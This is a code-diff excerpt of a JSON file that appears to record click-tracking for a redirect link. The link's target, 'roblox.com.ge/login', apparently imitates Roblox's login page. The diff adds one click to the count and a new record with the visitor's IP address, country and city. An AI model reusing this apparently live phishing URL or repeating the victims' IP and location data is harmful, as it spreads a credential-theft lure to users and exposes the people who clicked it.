@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1125,
+    "useCount": 1126,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9144,6 +9144,14 @@
         "city": "Saint Paul",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777274632219,
+        "ip": "49.144.96.233",
+        "country": "Philippines",
+        "city": "Dasmariñas",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
